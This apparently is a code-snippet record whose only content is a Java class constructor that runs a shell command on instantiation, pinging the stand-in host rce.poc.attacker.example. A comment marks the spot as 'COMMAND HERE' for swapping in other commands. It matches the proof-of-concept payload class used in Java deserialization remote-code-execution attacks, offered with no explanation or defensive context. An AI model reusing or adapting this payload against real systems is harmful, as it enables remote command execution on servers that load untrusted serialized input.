---
id: 8bf0f56d-355d-4361-af90-c4aeead85a59
type: code
language: Java
verified: false
created_at: '2023-04-06T03:55:59.689930+00:00'
updated_at: '2023-04-10T20:22:30.975279+00:00'
---

# Code Snippet 8bf0f56d

**Language**: Java

```java
public AwesomeScriptEngineFactory() {
    try {
        Runtime.getRuntime().exec("ping rce.poc.attacker.example"); // COMMAND HERE
    } catch (IOException e) {
        e.printStackTrace();
    }
}
```


